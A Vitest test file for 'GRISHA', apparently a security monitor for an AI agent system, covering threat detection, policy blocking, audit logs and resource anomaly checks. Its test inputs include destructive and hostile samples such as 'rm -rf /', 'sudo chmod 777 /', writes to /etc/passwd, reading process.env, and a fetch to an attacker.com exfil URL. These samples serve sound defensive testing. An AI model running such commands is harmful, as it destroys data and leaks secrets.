/**
 * GRISHA Security Capsule Tests
 * Validates threat detection, audit logging, and vision oversight
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { GrishaCapsule } from '../index';
import { 
  analyzeThreat, 
  validateOperation,
  ATLAS_SECURITY_POLICY,
  ThreatLevel,
  CODE_INJECTION_POLICY,
  FILE_SYSTEM_POLICY,
  NETWORK_POLICY,
  RESOURCE_POLICY,
  PRIVILEGE_POLICY
} from '../policies';
import { GrishaVision } from '../vision';
import { BrainGhost } from '../../brain/ghost';

describe('GRISHA Threat Detection', () => {
  describe('Code Injection Threats', () => {
    it('should detect eval execution', () => {
      const code = 'const result = eval("1+1")';
      const result = analyzeThreat(code, CODE_INJECTION_POLICY);
      
      expect(result.threatsFound.length).toBeGreaterThan(0);
      expect(result.maxSeverity).toBe(ThreatLevel.CRITICAL);
      expect(result.riskScore).toBeGreaterThan(50);
    });

    it('should detect Function constructor', () => {
      const code = 'new Function("return process.env")()';
      const result = analyzeThreat(code, CODE_INJECTION_POLICY);
      
      expect(result.threatsFound.length).toBeGreaterThan(0);
      expect(result.maxSeverity).toBe(ThreatLevel.CRITICAL);
    });

    it('should detect dynamic require', () => {
      const code = 'const mod = require(userInput)';
      const result = analyzeThreat(code, CODE_INJECTION_POLICY);
      
      expect(result.threatsFound.length).toBeGreaterThan(0);
      expect(result.maxSeverity).toBe(ThreatLevel.DANGER);
    });

    it('should detect system execution', () => {
      const code = 'exec("rm -rf /")';
      const result = analyzeThreat(code, CODE_INJECTION_POLICY);
      
      expect(result.threatsFound.length).toBeGreaterThan(0);
      expect(result.maxSeverity).toBe(ThreatLevel.CRITICAL);
    });
  });

  describe('File System Threats', () => {
    it('should detect rm -rf /', () => {
      const code = 'rm -rf /';
      const result = analyzeThreat(code, FILE_SYSTEM_POLICY);
      
      expect(result.threatsFound.length).toBeGreaterThan(0);
      expect(result.maxSeverity).toBe(ThreatLevel.CRITICAL);
    });

    it('should detect file deletion', () => {
      const code = 'unlink("./config.json")';
      const result = analyzeThreat(code, FILE_SYSTEM_POLICY);
      
      expect(result.threatsFound.length).toBeGreaterThan(0);
      expect(result.maxSeverity).toBe(ThreatLevel.DANGER);
    });

    it('should detect /etc/ writes', () => {
      const code = 'writeFileSync("/etc/passwd", "hacked")';
      const result = analyzeThreat(code, FILE_SYSTEM_POLICY);
      
      expect(result.threatsFound.length).toBeGreaterThan(0);
      expect(result.maxSeverity).toBe(ThreatLevel.DANGER);
    });
  });

  describe('Network Threats', () => {
    it('should detect external callbacks', () => {
      const code = 'fetch("https://attacker.com/exfil")';
      const result = analyzeThreat(code, NETWORK_POLICY);
      
      expect(result.threatsFound.length).toBeGreaterThan(0);
      expect(result.maxSeverity).toBe(ThreatLevel.DANGER);
    });

    it('should detect socket connections', () => {
      const code = 'socket.connect("192.168.1.1:9999")';
      const result = analyzeThreat(code, NETWORK_POLICY);
      
      expect(result.threatsFound.length).toBeGreaterThan(0);
    });
  });

  describe('Resource Exhaustion Threats', () => {
    it('should detect infinite loops', () => {
      const code = 'while (true) { console.log("loop") }';
      const result = analyzeThreat(code, RESOURCE_POLICY);
      
      expect(result.threatsFound.length).toBeGreaterThan(0);
      expect(result.maxSeverity).toBe(ThreatLevel.DANGER);
    });

    it('should detect memory bombs', () => {
      const code = 'Buffer.alloc(100000000)';
      const result = analyzeThreat(code, RESOURCE_POLICY);
      
      expect(result.threatsFound.length).toBeGreaterThan(0);
      expect(result.maxSeverity).toBe(ThreatLevel.DANGER);
    });
  });

  describe('Privilege Escalation Threats', () => {
    it('should detect sudo execution', () => {
      const code = 'sudo rm -rf /';
      const result = analyzeThreat(code, PRIVILEGE_POLICY);
      
      expect(result.threatsFound.length).toBeGreaterThan(0);
      expect(result.maxSeverity).toBe(ThreatLevel.CRITICAL);
    });
  });
});

describe('GRISHA Policy Validation', () => {
  it('should allow whitelisted operations', () => {
    const result = validateOperation('read_file', { path: '/data/config.json' });
    expect(result.allowed).toBe(true);
  });

  it('should allow safe operations', () => {
    const result = validateOperation('memory_store', { key: 'data', value: 'test' });
    expect(result.allowed).toBe(true);
  });

  it('should block dangerous operations', () => {
    const result = validateOperation('execute_code', { code: 'eval("1+1")' });
    expect(result.allowed).toBe(false);
    expect(result.reason).toBeDefined();
  });

  it('should calculate risk scores correctly', () => {
    const result = validateOperation('execute_code', { code: 'eval("dangerous")' });
    expect(result.riskLevel).toBe(ThreatLevel.CRITICAL);
  });
});

describe('GrishaCapsule Audit Logging', () => {
  let capsule: GrishaCapsule;
  let brain: BrainGhost;

  beforeEach(() => {
    brain = new BrainGhost();
    capsule = new GrishaCapsule(brain as any);
  });

  it('should log allowed operations', async () => {
    await capsule.audit({ action: 'read_file', params: { path: '/data/file.txt' } });
    const report = await capsule.getSecurityReport();
    expect(report.auditLogSize).toBeGreaterThan(0);
  });

  it('should log blocked operations', async () => {
    await capsule.audit({ action: 'execute_code', params: { code: 'eval("1+1")' } });
    const report = await capsule.getSecurityReport();
    expect(report.blockedOperations).toBeGreaterThan(0);
  });

  it('should calculate threat level', async () => {
    for (let i = 0; i < 3; i++) {
      await capsule.audit({ 
        action: 'execute_code', 
        params: { code: `eval("${i}")` } 
      });
    }
    
    const report = await capsule.getSecurityReport();
    expect(['low', 'medium', 'high']).toContain(report.threatLevel);
  });

  it('should prune old audit logs', async () => {
    for (let i = 0; i < 150; i++) {
      await capsule.audit({ action: 'test_action', params: {} });
    }
    
    capsule.pruneAuditLog(100);
    const report = await capsule.getSecurityReport();
    expect(report.auditLogSize).toBeLessThanOrEqual(100);
  });
});

describe('GrishaVision Visual Anomaly Detection', () => {
  let vision: GrishaVision;

  beforeEach(() => {
    vision = new GrishaVision('mock-key');
  });

  it('should detect UI anomalies', async () => {
    const elements = [
      { type: 'dialog', x: 0, y: 0, width: 900, height: 700 },
      { type: 'input', x: 100, y: 100, width: 600, height: 50 }
    ];
    
    const report = await vision.detectUIAnomalies(elements);
    expect(report.anomaliesDetected).toBe(true);
    expect(report.anomalies.length).toBeGreaterThan(0);
  });

  it('should detect resource anomalies', async () => {
    const metrics = { cpuUsage: 95, memoryUsage: 92, diskUsage: 98 };
    const report = await vision.detectResourceAnomalies(metrics);
    
    expect(report.anomaliesDetected).toBe(true);
    expect(report.anomalies.length).toBeGreaterThan(0);
  });

  it('should detect high CPU usage', async () => {
    const metrics = { cpuUsage: 95, memoryUsage: 30, diskUsage: 50 };
    const report = await vision.detectResourceAnomalies(metrics);
    
    expect(report.anomalies.some(a => a.type === 'high_cpu')).toBe(true);
  });

  it('should detect memory leaks', async () => {
    const metrics = { cpuUsage: 50, memoryUsage: 88, diskUsage: 50 };
    const report = await vision.detectResourceAnomalies(metrics);
    
    expect(report.anomalies.some(a => a.type === 'elevated_memory')).toBe(true);
  });

  it('should detect disk space issues', async () => {
    const metrics = { cpuUsage: 50, memoryUsage: 50, diskUsage: 97 };
    const report = await vision.detectResourceAnomalies(metrics);
    
    expect(report.anomalies.some(a => a.type === 'disk_full')).toBe(true);
  });

  it('should provide recommendations', async () => {
    const metrics = { cpuUsage: 95, memoryUsage: 95, diskUsage: 98 };
    const report = await vision.detectResourceAnomalies(metrics);
    
    expect(report.recommendations.length).toBeGreaterThan(0);
  });
});

describe('GRISHA Integration Flow', () => {
  let capsule: GrishaCapsule;
  let brain: BrainGhost;

  beforeEach(() => {
    brain = new BrainGhost();
    capsule = new GrishaCapsule(brain as any);
  });

  it('should generate complete security report', async () => {
    await capsule.audit({ action: 'read_file', params: { path: '/data/file.txt' } });
    await capsule.audit({ action: 'execute_code', params: { code: 'eval("x")' } });
    await capsule.audit({ action: 'memory_store', params: { key: 'test' } });
    
    const report = await capsule.getSecurityReport();
    
    expect(report.auditLogSize).toBe(3);
    expect(report.blockedOperations).toBe(1);
    expect(report.threatLevel).toBeDefined();
    expect(report.topThreats).toBeDefined();
  });

  it('should generate safety report from observation', async () => {
    await capsule.audit({ action: 'execute_code', params: { code: 'eval("1+1")' } });
    const safetyReport = await capsule.observe();
    
    expect(safetyReport.threats).toBeDefined();
    expect(safetyReport.level).toBeDefined();
    expect(safetyReport.timestamp).toBeDefined();
  });

  it('should handle multiple threat categories', async () => {
    const threats = [
      { action: 'execute_code', params: { code: 'eval("x")' } },
      { action: 'delete_file', params: { path: '/etc/passwd' } },
      { action: 'network_call', params: { url: 'https://attacker.com' } },
      { action: 'memory_alloc', params: { size: 100000000 } },
      { action: 'privilege', params: { cmd: 'sudo chmod 777 /' } }
    ];

    for (const threat of threats) {
      await capsule.audit(threat);
    }

    const report = await capsule.getSecurityReport();
    expect(report.blockedOperations).toBeGreaterThan(0);
    expect(report.topThreats.length).toBeGreaterThan(0);
  });
});
